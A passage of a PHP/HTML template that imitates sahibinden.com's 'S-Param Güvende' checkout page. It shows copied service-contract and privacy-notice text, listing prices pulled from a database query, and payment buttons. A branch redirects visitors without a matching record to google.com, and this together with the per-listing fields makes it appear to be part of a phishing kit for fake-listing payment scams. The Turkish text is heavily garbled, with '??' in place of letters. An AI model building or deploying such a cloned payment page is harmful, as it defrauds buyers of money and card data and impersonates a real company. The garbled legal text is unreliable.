          <p style="margin:0 0 15px 0;">????bu S??zle??me, ???Hizmet Veren??? taraf??ndan sa??lanan ???S-Param G??vende??? hizmetine ili??kin sorumluluklar?? belirlemekte olup, ???Hizmet Alan?????n i??bu ???Hizmet???ten yararlanarak sat??n ald?????? ??r??n ile ilgili ???Hizmet Veren???e herhangi bir y??k??ml??l??k getirmemektedir. Sat??n al??nan ??r??n bak??m??ndan SAH??B??NDEN???in ???Arac?? Hizmet Sa??lay??c????? s??fat??yla hareket etti??ini, ???Hizmet Veren???in sat??n ald?????? ??r??ne veya ??r??n??n sat???? ve teslim s??re??lerine dair herhangi bir sorumlulu??u bulunmad??????n??, ??r??n ile ilgili her t??rl?? talep, iddia veya ??ik??yetinin muhatab??n??n sadece ??r??n??n sat??c??s?? oldu??unu ???Hizmet Alan??? kabul ve taahh??t etmektedir. </p>
          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 3- ???H??ZMET???E ??L????K??N B??LG??LER:</p>
          <p style="margin:0 0 2px 0;">???Hizmet???e ili??kin bilgiler a??a????da yer almaktad??r:</p>
          <p style="margin:0 0 2px 0;">???Hizmet???in Ad??: ???S-Param G??vende???</p>
          <p style="margin:0 0 2px 0;">Hizmet A????klamas??: Detayl?? bilgi i??in Ek-1???deki S-Param G??vende Hizmeti Kurallar??n?? inceleyiniz</p>
          <p style="margin:0 0 2px 0;">Adedi: 1</p>
          <p style="margin:0 0 2px 0;">Pe??in Fiyat?? (t??m vergiler d??hil): <span id="parisFeeUnit"> <?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
          </p>
          <p style="margin:0 0 2px 0;">??deme ??ekli: Kredi kart?? veya banka kart??</p>
          <p style="margin:0 0 15px 0;">Taksit Se??ene??i: <span id="parisInstallmentCount">Tek ??ekim</span>
          </p>
          <table border="1" cellspacing="0" cellpadding="10" style="min-height: 75px; width: 100%; margin-bottom: 20px; border-collapse: collapse;border: 1px solid #d8d8d8; white-space: nowrap; color: #999999;" class="agreement-table">
            <tbody>
              <tr style="text-align: left; color: #999;">
                <th style="width: 100%; border: 1px solid #d8d8d8;">Hizmet Ad??</th>
                <th style="border: 1px solid #d8d8d8;">Adet</th>
                <th style="border: 1px solid #d8d8d8;">Pe??in Fiyat??*</th>
                <th style="border: 1px solid #d8d8d8;">Toplam Tutar**</th>
                <th class="installment-price-info" style="border: 1px solid #d8d8d8;display: none;">Taksitle ??denecek Toplam Tutar***</th>
              </tr>
              <tr>
                <td style="white-space: normal; border: 1px solid #d8d8d8;">S - Param G??vende Hizmeti</td>
                <td style="border: 1px solid #d8d8d8;">1</td>
                <td style="border: 1px solid #d8d8d8;" class="nowrap">
                  <span id="parisFeeUnit"> <?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                </td>
                <td style="border: 1px solid #d8d8d8;" class="nowrap">
                  <span id="parisFeeUnit"> <?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                </td>
                <td class="nowrap installment-price-info" style="border: 1px solid #d8d8d8;display: none;">
                  <span id="parisFeeTotal"> <?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                </td>
              </tr>
            </tbody>
          </table>
          <ul class="table-description" style="list-style-type: none; color: #999999; margin-bottom: 10px; padding: 0;">
            <li>* T??m vergiler dahil pe??in birim fiyat?? g??sterir.</li>
            <li>** T??m vergiler dahil toplam tutar?? g??sterir.</li>
            <li class="installment-price-info" style="display: none;">*** T??m vergiler ve taksit fark?? dahil toplam tutar?? g??sterir.</li>
          </ul>
          </p>
          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 4 - GENEL H??K??MLER</p>
          <ol style="margin:0 0 15px 0;list-style-type:none">
            <li> 4.1. ???Hizmet Alan???, yukar??da 3. Maddede ve i??bu S??zle??me???nin ekinde yer alan Ek-1???de belirtilen ???Hizmet???in ??zelliklerine ve sat??????na ili??kin ko??ullar?? ve t??m bilgileri okudu??unu, bu ???Hizmet???i sat??n almak i??in gerekli onay?? elektronik ortamda verdi??ini kabul, beyan ve taahh??t eder. </li>
            <li> 4.2. ????bu S??zle??me ???Hizmet Alan??? taraf??ndan elektronik olarak onayland?????? tarihte y??r??rl????e girer. </li>
            <li> 4.3. Sat??n al??nan hizmetin fiziksel bir teslimat?? yoktur. </li>
          </ol>
          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE- 5 CAYMA HAKKI:</p>
          <p style="margin:0 0 2px 0;">Mesafeli S??zle??meler Y??netmeli??i???nin 15(h) maddesinde ???cayma hakk?? s??resi sona ermeden ??nce t??keticinin onay?? ile ifas??na ba??lanan hizmet s??zle??meleri??? cayma hakk??n??n istisnas?? olarak kabul edildi??inden; ???Hizmet Alan??? i??bu s??zle??meye konu ???Hizmet??? bak??m??ndan cayma hakk??n??n olmad??????n?? ???Hizmet Alan??? kabul eder.</p>
          <p style="margin:0 0 15px 0;">Hizmet Alan, Mesafeli S??zle??meler Y??netmeli??i gere??i cayma hakk??na ili??kin bilgilendirmenin gere??i gibi yap??ld??????n?? kabul eder.</p>
          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE- 6 YETK??L?? MAHKEME:</p>
          <p style="margin:0 0 15px 0;">???Hizmet Alan?????n ???Hizmet???e ili??kin her t??rl?? ??ik??yet ve itiraz??na ili??kin ba??vurular??nda vei??bu S??zle??me ile ilgili ????kabilecek di??er ihtilaflarda her y??l G??mr??k ve Ticaret Bakanl?????? taraf??ndan ilan edilen de??ere kadar ???Hizmet Alan?????n veya ???Hizmet Veren???in yerle??im yerinin bulundu??u yerdeki T??ketici Hakem Heyetleri, s??z konusu de??erin ??zerindeki ihtilaflarda ise T??ketici Mahkemeleri yetkilidir.</p>
          <p style="margin:0 0 15px 0; font-weight:bold;">Eki: Ek-1 Param G??vende Hizmeti Kurallar??</p>
          <ol style="list-style-position: inside; list-style-type: decimal;">
            <li> S-Param G??vende Hizmeti???(???Hizmet???); ???Sat??c?????n??n Portal???da ilan??n?? verdi??i ikinci el veya s??f??r ??r??n?? (bundan b??yle ?????r??n??? olarak an??lacakt??r) ???Al??c?????n??n kredi kart??yla veya banka kart??yla g??venli olarak sat??n almas??na y??nelik SAH??B??NDEN hizmetidir. Bu ama??la SAH??B??NDEN; "Al??c??" ve "Sat??c??"n??n "Portal"da ??evrimi??i (online) ortamda anla??malar??n?? sa??layacak alt yap??y?? sa??lamakta, ???Sat??c?????; ???kargo ile g??nderim??? tercihi ile ??r??ne ili??kin ilan?? yay??nlamakta, ???Al??c??"; elektronik ortamda ???S-Param G??vende??? hizmetini sat??n alarak ilandaki ??r??n?? sipari?? etmektedir. S-Param G??vende Hizmet Bedeli; ???SAH??B??NDEN???in de??i??en piyasa ko??ullar??na g??re belirledi??i, ??r??n/??r??nlere ili??kin ??denecek toplam ??r??n bedeli ??zerinden hesaplanan ???Al??c?????n??n ??dedi??i hizmet bedelidir. ??r??n bedeli, ???Al??c?????n??n kredi kart??ndan veya banka kart??ndan ???SAH??B??NDEN???in anla??mal?? ??deme kurulu??u ??ekildi??i an itibariyle g??vence alt??na al??nd??????ndan; ???Al??c?????n??n S-Param G??vende hizmetinden cayma hakk?? yoktur. ???Al??c?????n??n S-Param G??vende hizmetini sat??n almas?? ??zerine yapt?????? ??deme g??vence alt??na al??nd??????ndan SAH??B??NDEN S-Param G??vende hizmet bedeline hak kazan??r. Sadece ??r??n??n ???Sat??c????? taraf??ndan kargoya verilmemesi veya ??r??n kargoya verilmeden sat??????n??n Sat??c?? taraf??ndan iptal edilmesi halinde; ???S-Param G??vende Hizmet Bedeli??? ???Al??c?????ya iade edilir, di??er t??m hallerde ???S-Param G??vende Hizmet Bedeli??? SAH??B??NDEN???in hesab??na aktar??l??r. Taraflar, i??bu S??zle??me h??k??mleri kapsam??nda, ??r??n bedelinin ???SAH??B??NDEN???in anla??mal?? ??deme kurulu??u taraf??ndan muhafaza edilmesi ve S-Param G??vende hizmeti ko??ullar??na uygun olarak ilgili tarafa aktar??lmas?? i??lemlerinin koordinasyonunun ???SAH??B??NDEN??? taraf??ndan y??r??t??lece??i konusunda mutab??kt??r. </li>
            <li> ???Al??c????? ve ???Sat??c????? bu ama??la ??r??n sat??????na y??nelik s??zle??meyi okuyup, kabul edip, ???Anla??mal?? Kargo ile G??nderim Ko??ullar?????n?? onaylayarak, bu d??zenlemelere uygun davranmay?? kabul ve taahh??t etmektedir. </li>
            <li> S-Param G??vende Hizmet Bedeli???nin ve ??r??n bedelinin ??denmesinde "Al??c??"ya anla??mal?? bankalar arac??l??????yla taksitle ??deme kolayl?????? sunulabilir. "Al??c??" taksitle ??demeyi tercih ederse, taksitli ??demeden do??an taksit (vade) fark??n?? bankaya ??demeyi kabul eder. Taksit fark??, SAH??B??NDEN taraf??ndan ???Al??c?????ya fatura edilir ve ??r??n sat???? ve teslimine y??nelik s??re??lerin tamamlanmas?? ??zerine taksit fark?? tutar?? ???SAH??B??NDEN???in anla??mal?? ??deme kurulu??u taraf??ndan ilgili bankaya aktar??l??r. Taksit fark?? bankaya ve ??r??n tutar??na g??re de??i??iklik g??sterebilir. Mevzuat gere??i belirli kategorilerde taksitli ??deme k??s??tlamas?? uygulan??r. </li>
            <li> Al??c??n??n, ??demeyi yaparak sipari?? vermesi ??zerine; ??r??n??n ???Sat??c????? taraf??ndan ???Al??c?????ya kargo ile g??nderilmesi amac??yla ???Al??c?????n??n ad??-soyad??/ticari unvan??, a????k teslimat adresi, telefon numaras??n?? i??eren ???kargo kodu???; ???Sat??c????? ve ???Anla??mal?? Kargo??? firmas?? ile payla????l??r. </li>
            <li> ???Sat??c????? taraf??ndan anla??mal?? kargo ile g??nderilen ??r??n?? ???Al??c????? teslim almakla y??k??ml??d??r. ???Al??c????? ??r??n?? teslim ald??ktan sonra Portal ??zerinden onaylamas?? halinde; ?????r??n sat???? ve teslim s??re??leri tamamlanm???? olur ve ??r??n bedeli "Sat??c??"ya aktar??l??r. ???Al??c????? ??r??ne onay verdikten sonra verdi??i onay?? hi??bir ??ekilde geri alamaz, verdi??i onay ile iade hakk?? sona erer. Yine ??r??n??n onay??n??n veya iadesinin S-Param G??vende hizmeti kurallar??na uygun olarak s??resi i??inde ger??ekle??tirilmemesi veya ??r??n??n anla??mal?? kargo firmas??na teslim edilmemesi halinde de; ??r??n sat???? ve teslimine y??nelik s??re??ler tamamlanm???? say??l??r ve ??r??n bedeli "Sat??c??"ya, ???S-Param G??vende Hizmet Bedeli??? ise SAH??B??NDEN???e aktar??l??r. </li>
            <li> ???Al??c????? ??r??n?? ???Sat??c?????ya iade etmek isterse; ???Portal???da ??r??n?? iade etmeye y??nelik butona basarak, ekranda belirtilen s??re i??inde ve ekranda g??sterilen ???kargo kodu??? ile "Sat??c??"ya iade edilmek ??zere kargo ??creti ??demeksizin ??r??n?? anla??mal?? kargo firmas??na teslim eder. ???Al??c?????, ??r??n?? ambalaj??, varsa standart aksesuarlar?? ve faturas?? ile birlikte kullan??lmam???? olarak, eksiksiz ve hasars??z olarak iade etmelidir. ???Al??c?????, ???S-Param G??vende??? hizmeti kapsam??ndan ????kmamak i??in, ??r??n?? sadece anla??mal?? kargo firmas?? ile iade edebilir. ???Al??c?????n??n ??r??n?? ???Sat??c?????ya iade etmesi halinde; ??r??n bedeli ???Al??c?????ya iade edilir. Ancak S-Param G??vende Hizmet Bedeli SAH??B??NDEN???e aktar??l??r. </li>
            <li> ???Al??c?????n??n ??r??n?? SAH??B??NDEN???in anla??mal?? kargo firmas?? ile ???Sat??c?????ya iade etmemesi halinde; ??r??n sat?????? ba??ar??l?? olarak tamamlanm???? say??lacak,&nbsp; ??r??n bedeli ???Sat??c?????ya aktar??lacak, ???S-Param G??vende Hizmet Bedeli??? ise SAH??B??NDEN???e aktar??lacakt??r.&nbsp; ??r??n bedelinin aktar??m??na dair bankadan veya anla??mal?? ??deme kurulu??undan kaynaklanabilecek olas?? gecikmelerden ???SAH??B??NDEN??? sorumlu tutulamayacakt??r. </li>
            <li> ???Sat??c?????n??n iade edilen ??r??n?? teslim ald??????n??, teslim alma saatinden itibaren 48 saat i??inde sistem ??zerinden onaylamas?? ??zerine ??r??n bedeli Al??c?????ya iade edilir. Ancak iade edilen ??r??nde uygunsuzluk veya herhangi bir sorun ya??amas?? halinde teslim alma an??ndan ba??layacak 24 (yirmi d??rt) saatlik s??re i??inde ???Sat??c?????, ???SAH??B??NDEN??? M????teri Hizmetlerini arayarak iadeye ili??kin ya??ad?????? sorunu bildirmelidir. ???Sat??c?????, M????teri Hizmetlerine sorununu bildirmesinden itibaren 7 (yedi) i?? g??n?? s??re i??inde ???Al??c?????ya kar???? yasal yollara m??racaat etti??ini belgeleyen evrak sunmas?? halinde; ??r??n bedeli Al??c?????ya iade edilmeyecek, uyu??mazl??k sonu??lanana dek SAH??B??NDEN???in anla??mal?? ??deme kurulu??unun hesab??nda bloke edilecek, ba??vurulan merciinin karar?? ????kt??????nda bu karara g??re hareket edilecektir. ???Al??c????? ve ???Sat??c?????, uyu??mazl??k konusu karara ba??lanana dek ??r??n bedelinin bloke edilmesi nedeniyle ???SAH??B??NDEN???e kar???? ??ik??yet/dava yoluna ba??vurmayaca????n??, ???SAH??B??NDEN???den herhangi bir talepte bulunmayaca????n?? kabul, beyan ve taahh??t eder. ??r??n??n teslim edilmesinden itibaren 24 (yirmi d??rt) saatlik s??re i??inde ???SAH??B??NDEN??? M????teri Hizmetlerine ???Sat??c????? taraf??ndan sorun bildiriminde bulunulmaz veya ??r??n??n teslim al??nd?????? onaylanmazsa; ??r??n bedeli 48 (k??rk sekiz) saat i??inde ???Al??c?????ya iade edilir. </li>
            <li> ???SAH??B??NDEN??? ????pheli i??lem tespit etmesi halinde; ???Al??c?? ve ???Sat??c????? aras??ndaki i??lemi durdurabilir, ???S-Param G??vende hizmetini duraklatarak ek bilgi/belge talep edebilir, ???Al??c????? ve/veya ???Sat??c?????n??n ??yeli??ini ge??ici veya s??rekli olarak durdurabilir. Bu t??r i??lemler sebebiyle ??r??n sat???? ve teslimine ili??kin s??re??lerde gecikmeye sebebiyet verildi??inden bahisle ???SAH??B??NDEN???den herhangi bir talepte bulunulamaz. </li>
            <li> ???Al??c????? Platform ??zerinden sat??n al??m esnas??nda kulland?????? kredi kart?? bilgilerinin,&nbsp;SAH??B??NDEN???in anla??mal?? ??deme kurulu??u nezdinde saklanmas??n?? talep edebilir. Kart bilgilerinin saklanmas??na ili??kin t??m g??venlik ??nlemleri ??????nc?? ki??i olan ??deme kurulu??unca sa??lanacak olup, SAH??B??NDEN???in kredi kart?? bilgilerine eri??imi bulunmayacakt??r. Bu sebeple ???Al??c????? kredi kart?? bilgilerinin g??venli??inin sa??lanmas?? konusunda sorumlulu??un sadece anla??mal?? ??deme kurulu??unda oldu??unu kabul etmektedir. </li>
            <li> ???Al??c?????, i??bu S??zle??me???yi veya bu S??zle??me???nin kapsam??ndaki hak ve y??k??ml??l??klerini k??smen veya tamamen herhangi bir ??????nc?? ki??iye devredemez. </li>
            <li> ???S-Param G??vende??? hizmeti, ???Al??c?????n??n ??deyece??i ??r??n bedelinin SAH??B??NDEN anla??mal?? ??deme kurulu??unun hesab??nda g??venli olarak muhafaza edilmesinden ibaret olup, ilandaki ??r??n??n ???Sat??c????? taraf??ndan ???Al??c?????ya teslim edilece??i SAH??B??NDEN taraf??ndan garanti edilmemektedir. </li>
            <li> ???Al??c?????, ???SAH??B??NDEN???in ???Yer Sa??lay??c????? ve ???Arac?? Hizmet Sa??lay??c????? s??fat??yla faaliyet g??steren sanal bir platform oldu??unu, ??r??n??n sahibi olmad??????n??, ???Portal???da yay??nlanan ilanlardaki ??r??nler ile ilgili sat??c??, tedarik??i, imalat????-ithalat????, bayi veya benzeri herhangi bir ili??kisinin/s??fat??n??n bulunmad??????n??, ???Arac?? Hizmet Sa??lay??c?????n??n 6502 say??l?? T??keticinin Korunmas?? Hakk??ndaki Kanun ve 6563 say??l?? Elektronik Ticaretin D??zenlenmesi Hakk??nda Kanun uyar??nca hi??bir yasal sorumlulu??u bulunmad??????n??, sat??n ald?????? ??r??n ile ilgili iade i??lemleri dahil yapt?????? sat??n alma ile ilgili her t??rl?? talebinin yegane muhatab??n??n ??r??n?? sat????a sunan ???Sat??c????? oldu??unu, ???SAH??B??NDEN???in ??r??n??n sat?????? ve kargo ile g??nderilmesine y??nelik ???Al??c????? ve ???Sat??c????? aras??nda ger??ekle??en i??lemlerin hi??bir a??amas??na taraf olmad??????n??, ??r??n sipari??i ilgili ya??anabilecek herhangi bir uygunsuzluk hakk??nda SAH??B??NDEN???den talepte bulunmayaca????n??, SAH??B??NDEN???e kar???? yarg??sal yollara ba??vurmayaca????n?? kabul, beyan ve taahh??t etmektedir. </li>
            <li> Al??c?? veya Sat??c?????n??n ???Anla??mal?? Kargo ile G??nderim Ko??ullar??na??? ayk??r?? hareket etmesi nedeniyle SAH??B??NDEN???in herhangi bir zarara u??ramas??, idari para cezas?? veya tazminat ??demek durumunda kalmas?? halinde; SAH??B??NDEN???in zarara u??ramas??na sebep olan Al??c?? veya Sat??c??; SAH??B??NDEN???in maddi ve manevi, do??rudan ve dolayl?? her t??rl?? zarar?? ile idari para cezalar??n?? t??m fer???ileri ile birlikte derhal kar????layacakt??r. </li>
          </ol>
        </div>
      </div>
    </div>
  </div>
  <a href="#" class="back-to-the-future step-back step-back trackClick trackId_geriDon_v3 teslimatBackBtn" style="display: inline" data-click-category="odeme">&lt; Teslimat Bilgilerine Geri D??n</a>
</div>
<div class="right-box">
  <div class="sub-right-box item">
    <img class="big-image" src="assets/images/phones/<?=str_replace("'", '', explode(',', $query['ilan_resim'])[0])?>" height="174" width="232" alt="">
    <span> <?=$query['ilanad']?> </span>
  </div>
  <div class="sub-right-box prices">
    <div class="row">
      <span class="total-price-area right unit-price total-price item-total-price small-currency price-format-renew"><span class="fiyat"><?=beforeCommas($query['ilanfiyat'])?></span>,<span class="decimal"><?=afterCommas($query['ilanfiyat'])?></span>
        <span class="total-price-currency"> TL</span>
        <span class="sum-label"></span>
      </span>
      <div class="left unit numeric-input-holder prev-disabled next-disabled disable"></div>
    </div>
    <div class="seperator"></div>
    <div class="row">
      <span class="paris-fee-area right high total-price item-total-price small-currency price-format-renew"> <?=beforeCommas($query['hizmetbedeli'])?>, <span class="decimal"> <?=afterCommas($query['hizmetbedeli'])?></span>
        <span class="total-price-currency"> TL</span>
        <span class="sum-label"></span>
      </span>
      <p class="left">S - Param G??vende Hizmet Bedeli</p>
    </div>
    <div class="installment-cost-container disable">
      <div class="seperator"></div>
      <div class="row">
        <span id="installmentCostSpan" class="right total-price item-total-price small-currency price-format-renew">100 <span class="total-price-currency"> TL</span>
          <span class="sum-label"></span>
        </span>
        <p class="left">Taksit Fark??</p>
      </div>
    </div>
    <div class="seperator"></div>
    <div class="total-cost-container row">
      <span id="parisTotalCostSpan" class="paris-total-price-area right total-price small-currency price-format-renew"><?=addition($query['ilanfiyat']) + addition($query['hizmetbedeli'])?>,<span class="decimal">00</span>
        <span class="total-price-currency"> TL</span>
        <span class="sum-label"></span>
      </span>
      <p class="left total">Toplam</p>
    </div>
  </div>
  <div class="sub-right-box agreement">
    <div class="agreement-box financial">
      <input class="mss sg-checkbox" type="checkbox" name="mss" id="mss" autocomplete="off">
      <label for="mss">??r??n <a href="#" id="mssPopupLink" class="mssPopupLink">Sat???? S??zle??mesi</a> ve <br class="only-for-web">S - Param G??vende Hizmet S??zle??mesini kabul ediyorum. </label>
      <span class="errorLabel">L??tfen onaylay??n.</span>
    </div>
    <div class="agreement-box mss-inputs marketplace">
      <input type="checkbox" name="frameAgreement" id="frameAgreement" class="frame-agreement sg-checkbox" autocomplete="off">
      <label for="frameAgreement">
        <a href="#" id="marketPlaceProviderAgreementLink" class="marketPlaceProviderAgreementLink">??deme Kurulu??u ??er??eve S??zle??me ko??ullar??</a>n?? kabul ediyorum. </label>
      <span class="errorLabel">L??tfen onaylay??n.</span>
    </div>
  </div>
  <button id="makePaymentButton" class="btn btn-new make-payment-btn trackClick trackId_complete_purchase_v3 completeBtn" type="submit" style="width: 100%;">
    <span>??demeyi Tamamla</span>
  </button>
</div>
<div class="responsive-part payment-part">
  <div class="sub-right-box agreement">
    <div class="agreement-box financial">
      <input class="mss sg-checkbox" type="checkbox" name="mss" id="mssResp" autocomplete="off">
      <label for="mssResp">??r??n <a href="#" id="mssPopupLink" class="mssPopupLink">Sat???? S??zle??mesi</a> ve <br class="only-for-web">S - Param G??vende Hizmet S??zle??mesini kabul ediyorum. </label>
      <span class="errorLabel">L??tfen onaylay??n.</span>
    </div>
    <div class="agreement-box mss-inputs marketplace">
      <input type="checkbox" name="frameAgreement" id="frameAgreementResp" class="frame-agreement sg-checkbox">
      <label for="frameAgreementResp">??deme Kurulu??u <a href="#" class="marketPlaceProviderAgreementLink">??er??eve S??zle??me ko??ullar??</a>n?? kabul ediyorum. </label>
      <span class="errorLabel">L??tfen onaylay??n.</span>
    </div>
  </div>
  <div class="make-payment-btn-wrapper">
    <div class="paris-wrapper">
      <div class="row">
        <span class="right price-format-renew" id="itemsCost"><?=beforeCommas($query['ilanfiyat'])?>,<span class="decimal"><?=afterCommas($query['ilanfiyat'])?></span>
          <span class="total-price-currency"> TL</span>
          <span class="sum-label"></span>
        </span>
        <div class="left"> ??r??n Tutar?? <span class="responsive-item-count disable"> (1 adet) </span>
        </div>
      </div>
      <div class="row">
        <span class="right price-format-renew" id="parisCost"><?=beforeCommas($query['hizmetbedeli'])?>,<span class="decimal"><?=afterCommas($query['hizmetbedeli'])?></span>
          <span class="total-price-currency"> TL</span>
          <span class="sum-label"></span>
        </span>
        <p class="left">S - Param G??vende Hizmet Bedeli</p>
      </div>
      <div class="responsive-installment-cost-container disable">
        <div class="seperator"></div>
        <div class="row">
          <span id="installmentCostSpan" class="right price-format-renew">100 <span class="total-price-currency"> TL</span>
            <span class="sum-label"></span>
          </span>
          <p class="left">Taksit Fark??</p>
        </div>
      </div>
      <div class="responsive-total-cost-container row">
        <strong>
          <span id="parisTotalCostSpan" class="right price-format-renew paris-total-cost-span"><?=addition($query['ilanfiyat']) + addition($query['hizmetbedeli'])?>,<span class="decimal">00</span>
            <span class="total-price-currency"> TL</span>
            <span class="sum-label"></span>
          </span>
        </strong>
        <strong>
          <p class="left">Toplam</p>
        </strong>
      </div>
    </div>
    <a class="btn btn-new make-payment-btn trackClick trackId_complete_purchase_v3 responsiveComplete" type="submit">
      <span>??demeyi Tamamla</span>
    </a>
  </div>
</div>
              </div>
        </form>
        <?php 
          }else{
            header("Location: https://www.google.com/");
          } 
        ?>
        <div id="popups" class="popup-panel">
          <div class="delete-address-popup get-popup clearfix">
            <div id="deleteAddressPopup" class="popup">
              <div id="deleteAddressPopupLabel">
                <h3>
                  <strong>Adresi Sil</strong>
                </h3>
              </div>
              <p class="popup-content">
                <b id="addressNameToBeDeleted"></b> isimli adresiniz silinecektir.
              </p>
              <div class="down-right-side-action-section">
                <a id="deleteAddressPopupCancelButton" href="javascript:;" class="btn btn-new btn-new-alternative">Vazge??</a>
                <a id="deleteAddressPopupBtn" href="javascript:;" class="btn btn-new delete-popup-address">Adresi Sil</a>
                <a id="deleteAddressPopupBtnResponsive" href="javascript:;" class="btn btn-new delete-popup-address">Onayla</a>
              </div>
            </div>
          </div>
          <div id="kvkkInformation" class="kvkkInformation">
            <span>
              <p>
                <strong>Ki??isel Verilerin Korunmas?? ve ????lenmesi Hakk??nda Ayd??nlatma Metni</strong>
              </p>
              <p> ????bu Ki??isel Verilerin Korunmas?? ve ????lenmesi Hakk??nda Bilgilendirme???nin (Bilgilendirme) amac??, Sahibinden Bilgi Teknolojileri Pazarlama ve Ticaret Anonim ??irketi (Sahibinden) taraf??ndan y??netilmekte olan&nbsp; <a href="http://www.sahibinden.com/">https://www.sahibinden.com/</a>&nbsp;&nbsp;adresinde yer alan internet sitesinin, (Portal) kullan??m?? s??ras??nda elde edilen ve/veya ??????nc?? ki??ilerden al??nan ki??isel verilerin kullan??m??na ili??kin olarak 6698 say??l?? Ki??isel Verilerin Korunmas?? Hakk??nda Kanun???un (Ki??isel Verilerin Korunmas?? Kanunu) 10. maddesi ile getirilen ayd??nlatma y??k??ml??l??????n??n yerine getirilmesidir. Ayr??ca Kullan??c??lar?????n Portal?????n kullan??m?? ile ilgili olarak Sahibinden taraf??ndan toplanan veya Kullan??c??lar??n pozitif hareketleri ile kendilerinin Portal???a girdikleri ki??isel verilerin toplanma ??ekilleri, i??lenme ama??lar??, hukuki nedenleri ve haklar?? konular??nda ??effaf bir ??ekilde Kullan??c??lar?? bilgilendirmektir. </p>
              <p> ??e??itli kategorilerdeki ??r??n ve hizmetleri sunanlar ile potansiyel al??c??lar, Sahibinden???in sundu??u g??venli ortam ??zerinden bulu??arak al????veri??lerini yapmaktad??rlar. Bu faaliyet i??erisinde i??bu Bilgilendirme metninde belirtildi??i ??ekilde ki??isel veriler Sahibinden fonksiyonlar??n??n kullan??labilmesinin gere??i olarak i??lenmektedir.</p>
              <p> Sahibinden, teknolojiye yat??r??m yaparak yenilik??i ??r??n ve hizmet uygulamalar?? ile internet alan??nda Kullan??c??lar??na daha iyi hizmet vermek i??in s??rekli kendisini yenilemekte ve en iyi hizmeti verebilmek i??in ??al????makta, ki??isel verilerin hukuka uygun olarak toplanmas??, saklanmas?? ve payla????lmas??n?? sa??lamak ve gizlili??ini korumak amac??yla m??mk??n olan en ??st seviyede g??venlik tedbirlerini almaktad??r. Bu amac??n?? ger??ekle??tirebilmek i??in Kullan??c??lar??n ki??isel verileri a??a????da detaylar?? a????klanan kapsam ve ko??ullarda i??lenmektedir.</p>
              <p> Sahibinden, i??bu Bilgilendirme h??k??mlerini diledi??i zaman Portal ??zerinden yay??mlamak suretiyle g??ncelleyebilir ve de??i??tirebilir. Sahibinden???in yapt?????? g??ncelleme ve de??i??iklikler Portal???da yay??nland?????? tarihten itibaren ge??erli olacakt??r.</p>
              <p>
                <strong>a) Veri Sorumlusu</strong>
              </p>
              <p> Ki??isel Verilerin Korunmas?? Kanunu uyar??nca, ki??isel verileriniz; veri sorumlusu olarak Sahibinden taraf??ndan a??a????da a????klanan kapsamda toplanacak ve i??lenebilecektir.</p>
              <p>
                <strong>b) Toplanan Ki??isel Veriler</strong>
              </p>
              <p> Sahibinden, a??a????da belirtilen metodlarla Kullan??c??lar???dan ??e??itli statik (sabit) ve dinamik (de??i??ken) veriler toplamaktad??r. Sahibinden???in toplad?????? veriler, Kullan??c??lar??n kulland?????? hizmetlere ve ??zelliklere ba??l??d??r.</p>
              <p> ????bu ba??l??k alt??nda, Sahibinden taraf??ndan sunulan Hizmetler kapsam??nda i??lenen ve Ki??isel Verilerin Korunmas?? Kanunu uyar??nca ki??isel veri say??lan verilerin hangileri oldu??u a??a????da gruplar halinde s??ralanm????t??r. Aksi a????k??a belirtilmedik??e, i??bu Bilgilendirme???de arz edilen h??k??m ve ko??ullar kapsam??nda ???ki??isel veri??? ve ?????zel nitelikli ki??isel veri??? ifadeleri a??a????da yer alan bilgileri i??ermektedir:</p>
              <p>
                <strong>Ad ve ??leti??im Bilgileri:</strong>&nbsp;Ad, soyad??, cep telefonu, ev telefonu, i?? telefonu, adresi, e-posta adresi, fatura bilgileri, TC kimlik numaras?? (ulusal kimlik numaras??), kimlik fotokopisi ve benzer di??er belgeler.
              </p>
              <p>
                <strong>Kimlik Do??rulama Bilgileri:</strong>&nbsp;Kullan??c??lar??n ??yelik bilgileri, kimli??i do??rulamak i??in ve hesaba eri??imi sa??lamak i??in kullan??lan parolalar??, Kullan??c?? Ad??, kontak bilgileri, Kullan??c?? numaralar??, ilan numaralar??.
              </p>
              <p>
                <strong>Demografik Veriler:</strong>&nbsp;Do??um tarihi, cinsiyet, medeni hali, e??itim durumu, meslek, ilgi alanlar??, tercih edilen dil verileri.
              </p>
              <p>
                <strong>Kullan??m Verileri ve S??k Kullan??lanlar:&nbsp;</strong>??e??itli yaz??l??m ve teknolojik ara??lar vas??tas??yla cihazlar??n??zdan toplanan veriler Sahibinden???i veya ??a??r?? Merkezlerini arama nedenleriniz, ses kay??tlar??, emlak endeksi, ekspertiz, ??r??n??n kullan??ld?????? tarih ve saat verileri, endeks sorgusu olu??turulan il, il??e, mahalle, ??deme i??leminin ba??ar??l?? olmas?? halinde Sigorta Birli??i ve G??zetim Merkezi sistemi taraf??ndan ??retilen hasar sorgu raporunun al??nmas?? i??in ??asi&nbsp; ve plaka numaras??, Portal ??zerinden bak??lan ??r??nler, metrekare fiyatlar??, yurti??i veya yurtd?????? firmalar??n anket, banner y??nlendirme gibi mod??lleri ??zerinden kullan??c??lar??n ilgili ??r??ne y??nlenebilmeleri ve ??r??n tedarik??isi firmalar??n kullan??c?? ile ileti??ime ge??mesi i??in ilgili anket veya bannerda belirtilen veriler, bankadan emlak mod??l?? ??zerinden bankalar??n sat????a ????kard??klar?? gayrimenkuller i??in almak istedikleri teklife dair banka taraf??ndan istenen bilgiler, emlak projeleri i??in Portal ??zerinden m??teahhit firmalar??n projeleri ile ilgili bilgi almak i??in girilen veriler, hizmetlerin geli??tirilmesi ve taraf??n??za g??re ??zelle??tirilmesi ad??na kullan??m al????kanl??klar?? (??nceliklendirme se??enekleri, tercih edilen geri d??n???? metodu ve tarihi, cevap verilen kanallar, Portal???a son giri?? tarihi, kullan??lan Doping ilan t??r??, g??nderi t??r??, ziyaret edilen internet siteleri,&nbsp;g??r??nt??lenen sayfa say??s??, ziyaret s??resi ve hedef tamamlama say??s??, servisleri kullan??rken ger??ekle??tirilen kullan??c?? hareketleri, girilen arama terimleri, ziyaret edilen ??r??n ve ilanlar??n kategorileri,) hizmetlerin sorunsuz bir ??ekilde sa??lanabilmesinin temini amac??yla hizmet 